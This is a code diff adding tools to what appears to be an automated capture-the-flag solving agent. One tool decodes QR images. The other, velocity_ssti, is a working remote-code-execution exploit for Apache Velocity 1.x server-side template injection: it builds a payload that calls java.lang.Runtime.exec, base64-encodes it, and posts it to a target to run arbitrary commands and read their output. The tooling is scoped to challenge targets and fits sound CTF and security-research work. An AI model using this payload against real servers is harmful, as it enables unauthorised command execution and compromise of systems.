@@ -2,12 +2,47 @@
 
 from __future__ import annotations
 
+import base64
 import re
 import shlex
 
 from midnight.env.ctf_environment import CTFEnvironment
 from midnight.tools.category import _challenge_url, _result_text
 from midnight.tools.registry import register_tool
+
+
+@register_tool(name="qr_decode", groups=["misc", "forensics"])
+def make_qr_decode(*, env: CTFEnvironment, **_) -> object:
+    from langchain_core.tools import tool
+
+    @tool
+    async def qr_decode(image: str, output_dir: str = ".midnight-qr") -> str:
+        """Decode a local QR image after trying bounded normalization variants.
+
+        Use after extracting or reconstructing a likely QR code. The action
+        tries the original, nearest-neighbor scaling, grayscale thresholds, and
+        inversion, then reports only decoder-confirmed payloads.
+        """
+        source = shlex.quote(image)
+        destination = shlex.quote(output_dir)
+        command = (
+            f"test -f {source} || {{ echo '[error] image not found' >&2; exit 2; }}; "
+            f"rm -rf -- {destination}; mkdir -p -- {destination}; "
+            f"convert {source} -filter point -resize 800% {destination}/scaled.png; "
+            f"convert {destination}/scaled.png -colorspace Gray -threshold 35% {destination}/t35.png; "
+            f"convert {destination}/scaled.png -colorspace Gray -threshold 50% {destination}/t50.png; "
+            f"convert {destination}/scaled.png -colorspace Gray -threshold 65% {destination}/t65.png; "
+            f"convert {destination}/t50.png -negate {destination}/inverted.png; "
+            "found=0; for candidate in "
+            f"{source} {destination}/scaled.png {destination}/t35.png {destination}/t50.png "
+            f"{destination}/t65.png {destination}/inverted.png; do "
+            "decoded=$(zbarimg --quiet --raw \"$candidate\" 2>/dev/null) || true; "
+            "if test -n \"$decoded\"; then printf '[decoded:%s]\\n%s\\n' \"$candidate\" \"$decoded\"; found=1; fi; "
+            "done; test \"$found\" -eq 1 || { echo '[no QR payload decoded]' >&2; exit 3; }"
+        )
+        return _result_text(await env.exec(command, timeout=180))
+
+    return qr_decode
 
 
 @register_tool(name="archive_password", groups=["misc", "forensics"])
@@ -87,6 +122,65 @@ def make_tinja_ssti(*, env: CTFEnvironment, state=None, observe_target_output=No
         return _result_text(result)
 
     return tinja_ssti
+
+
+@register_tool(name="velocity_ssti", groups=["web"])
+def make_velocity_ssti(
+    *, env: CTFEnvironment, state=None, observe_target_output=None, **_
+) -> object:
+    from langchain_core.tools import tool
+
+    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")
+
+    @tool
+    async def velocity_ssti(
+        command: str,
+        url: str = "",
+        parameter: str = "text",
+        max_output_bytes: int = 512,
+    ) -> str:
+        """Run a bounded command through a confirmed Apache Velocity 1.x SSTI.
+
+        First use ``id`` or ``ls /`` as evidence. The tool reads process output
+        as byte values and decodes it locally, avoiding fragile reflection over
+        Java Scanner constructors. Use only on the bound challenge target.
+        """
+        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.-]{0,63}", parameter):
+            raise ValueError("parameter contains unsupported characters")
+        if not command or len(command) > 500 or any(char in command for char in "\r\n\0"):
+            raise ValueError("command must be a non-empty single line of at most 500 characters")
+        if max_output_bytes < 32 or max_output_bytes > 4096:
+            raise ValueError("max_output_bytes must be between 32 and 4096")
+        target = _challenge_url(url, remote)
+        escaped = command.replace("\\", "\\\\").replace('"', '\\"')
+        payload = (
+            '#set($x="")\n'
+            '#set($rt=$x.getClass().forName("java.lang.Runtime"))\n'
+            f'#set($p=$rt.getRuntime().exec("{escaped}"))\n'
+            '$p.waitFor()\n#set($is=$p.getInputStream())\n'
+            f'#foreach($i in [1..{max_output_bytes}])$is.read(),#end'
+        )
+        url_b64 = base64.b64encode(target.encode()).decode()
+        parameter_b64 = base64.b64encode(parameter.encode()).decode()
+        payload_b64 = base64.b64encode(payload.encode()).decode()
+        script = (
+            "import base64,html,re,requests;"
+            f"u=base64.b64decode('{url_b64}').decode();"
+            f"k=base64.b64decode('{parameter_b64}').decode();"
+            f"p=base64.b64decode('{payload_b64}').decode();"
+            "r=requests.post(u,data={k:p},timeout=20);r.raise_for_status();"
+            "m=re.search(r'<h2[^>]*class=[\"\\\']fire[\"\\\'][^>]*>(.*?)</h2>',r.text,re.S|re.I);"
+            "s=html.unescape(m.group(1) if m else r.text);"
+            "v=[int(x) for x in re.findall(r'(?<![0-9])-?[0-9]+(?=,)',s)];"
+            "v=[x for x in v if 0<=x<=255];"
+            "print(bytes(v).decode('utf-8','replace'))"
+        )
+        result = await env.exec(f"python3 -c {shlex.quote(script)}", timeout=60)
+        if observe_target_output is not None:
+            observe_target_output(f"{result.stdout}\n{result.stderr}")
+        return _result_text(result)
+
+    return velocity_ssti
 
 
 @register_tool(name="jwt_analyze", groups=["web"])
